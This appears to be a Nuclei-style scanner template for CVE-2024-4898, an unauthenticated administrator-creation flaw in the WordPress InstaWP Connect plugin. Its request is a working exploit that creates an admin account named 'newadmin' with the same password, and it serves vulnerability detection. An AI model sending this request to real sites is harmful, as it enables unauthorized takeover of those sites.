id: CVE-2024-4898

info:
  name: WordPress InstaWP Connect <= 0.1.0.38 - Unauthenticated User Creation
  author: Sourabh-Sahu
  severity: critical
  description: |
    The InstaWP Connect â€“ 1-click WP Staging & Migration plugin for WordPress is vulnerable to arbitrary option updates and unauthenticated administrator account creation due to missing authorization checks in the /wp-json/instawp-connect/v1/config REST API endpoint.
  remediation: |
    Update InstaWP Connect to version 0.1.0.39 or later, which patches this vulnerability.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/92a00fb4-7b50-43fd-ac04-5d6e29336e9c?source=cve
    - https://plugins.trac.wordpress.org/browser/instawp-connect/tags/0.1.0.38/includes/class-instawp-rest-api.php#L926
    - https://nvd.nist.gov/vuln/detail/CVE-2024-4898
  tags: cve,wordpress,instawp,unauth,rce

variables:
  api_key: "{{randstr}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-json/instawp-connect/v1/config"
    headers:
      Content-Type: application/json
    body: |
      {
        "api_key": "{{api_key}}",
        "wp": {
          "users": [
            {
              "username": "newadmin",
              "email": "newadmin@example.com",
              "password": "newadmin"
            }
          ]
        }
      }

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"status":true'
          - '"connect_id":'
          - '"message":"Connected"'
        condition: and
      - type: status
        status:
          - 200
